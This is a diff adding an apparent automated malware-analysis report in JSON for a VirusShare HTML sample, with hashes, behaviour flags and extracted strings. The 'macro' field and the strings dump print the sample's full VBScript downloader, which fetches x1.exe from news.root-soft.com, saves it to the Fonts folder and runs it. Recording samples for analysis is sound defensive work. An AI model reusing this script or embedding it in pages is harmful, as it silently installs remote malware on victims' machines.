@@ -1,0 +1,62 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "CreateObject": "May create an OLE object",
+            "CreateTextFile": "May create a text file",
+            "Msxml2.XMLHTTP": "May download files from the Internet",
+            "Open": "May open a file",
+            "WScript.Shell": "May run an executable file or a system command",
+            "Write": "May write to a file",
+            "chr": "May attempt to obfuscate specific str",
+            "run": "May run an executable file or a system command",
+            "shell": "May run an executable file or a system command"
+        },
+        "macro": "<script language=\"vbs\">\nself.MoveTo 5000,5000\nSet shell=CreateObject(\"WScript.Shell\")\nddd = shell.SpecialFolders(\"Fonts\") + \"\\\" + \"x1.exe\"\nset dot=CreateObject(\"Msxml2.XMLHTTP\")\ndot.Open \"GET\", \"http://news.root-soft.com/x1.exe\", false\n'WScript.Sleep(300)\ndot.Send()\ncs = dot.responseBody\nSet fso = CreateObject(\"Scripting.FileSystemObject\")\nSet f = fso.CreateTextFile(ddd)\nfor i = 0 to UBound(cs)\nc = ascb(midb(cs, i+1, 1))\nf.Write chr(c)\nnext\nf.close\nshell.run(ddd)\nwindow.close()\n</script>"
+    },
+    "filename": "VirusShare_d816fee7cf7a51d7a01895916d7cebcf",
+    "filesize": 512,
+    "filetype": "HTML document, ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "d816fee7cf7a51d7a01895916d7cebcf",
+        "sha1": "87afeb2919c171acead67cc19a4f13cae5bd295a",
+        "sha256": "63c6f9aa1bfe5e6729c477404265c6b5143bdcd8add717bf4dd27d29b9f6afe4"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "<script language=\"vbs\">",
+            "self.MoveTo 5000,5000",
+            "Set shell=CreateObject(\"WScript.Shell\")",
+            "ddd = shell.SpecialFolders(\"Fonts\") + \"\\\" + \"x1.exe\"",
+            "set dot=CreateObject(\"Msxml2.XMLHTTP\")",
+            "dot.Open \"GET\", \"http://news.root-soft.com/x1.exe\", false",
+            "'WScript.Sleep(300)",
+            "dot.Send()",
+            "cs = dot.responseBody",
+            "Set fso = CreateObject(\"Scripting.FileSystemObject\")",
+            "Set f = fso.CreateTextFile(ddd)",
+            "for i = 0 to UBound(cs)",
+            "c = ascb(midb(cs, i+1, 1))",
+            "f.Write chr(c)",
+            "next",
+            "f.close",
+            "shell.run(ddd)",
+            "window.close()",
+            "</script>"
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": [
+            "http://news.root-soft.com/x1.exe"
+        ]
+    },
+    "time": "0:00:00.282973",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
